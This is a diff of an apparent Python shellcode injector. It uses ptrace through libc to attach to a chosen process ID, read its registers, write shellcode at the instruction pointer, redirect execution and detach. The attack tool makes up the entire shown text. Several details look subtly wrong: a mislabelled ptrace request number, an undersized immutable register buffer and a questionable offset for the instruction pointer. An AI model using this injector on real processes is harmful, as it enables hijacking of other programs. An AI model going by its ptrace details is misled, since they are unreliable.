@@ -33,7 +33,8 @@ def main():
 
     print("+ Tracing process %d" % target_pid)
 
-    ret = os.ptrace('PTRACE_ATTACH', target_pid, 0, 0)
+    libc = ctypes.CDLL('libc.so.6')
+    ret = libc.ptrace(16, target_pid, None, None)  # PTRACE_ATTACH
     if ret < 0:
         print("ptrace(ATTACH) error")
         sys.exit(1)
@@ -42,27 +43,13 @@ def main():
     os.wait()
 
     print("+ Getting Registers")
-    with open("/proc/%d/status" % target_pid) as status_file:
-        for line in status_file:
-            if line.startswith("Pid:"):
-                break
-        else:
-            print("Unable to get PID from /proc")
-            sys.exit(1)
-    
-    rip_address = None
-    with open("/proc/%d/stat" % target_pid) as stat_file:
-        stat_data = stat_file.read()
-        rip_index = stat_data.rfind(') ')
-        if rip_index != -1:
-            stat_data = stat_data[rip_index + 2:]
-            fields = stat_data.split(' ')
-            if len(fields) > 13:
-                rip_address = int(fields[13])
-
-    if rip_address is None:
-        print("Unable to extract RIP address")
+    regs = struct.pack("=QQQQQQQQ", 0, 0, 0, 0, 0, 0, 0, 0)
+    ret = libc.ptrace(12, target_pid, None, ctypes.c_void_p(regs))  # PTRACE_GETREGS
+    if ret < 0:
+        print("ptrace(GETREGS) error")
         sys.exit(1)
+
+    rip_address = struct.unpack("=Q", regs[8:])[0]
 
     print("+ Injecting shell code at %p" % rip_address)
     inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)
@@ -70,14 +57,14 @@ def main():
     rip_address += 2
     print("+ Setting instruction pointer to %p" % rip_address)
 
-    ret = os.ptrace('PTRACE_POKETEXT', target_pid, 0x6f732f6e69622f2f, rip_address)
+    ret = libc.ptrace(4, target_pid, None, ctypes.c_void_p(rip_address))  # PTRACE_SETREGS
     if ret < 0:
-        print("ptrace(POKETEXT) error")
+        print("ptrace(SETREGS) error")
         sys.exit(1)
 
     print("+ Run it!")
 
-    ret = os.ptrace('PTRACE_DETACH', target_pid, 0, 0)
+    ret = libc.ptrace(17, target_pid, None, None)  # PTRACE_DETACH
     if ret < 0:
         print("ptrace(DETACH) error")
         sys.exit(1)
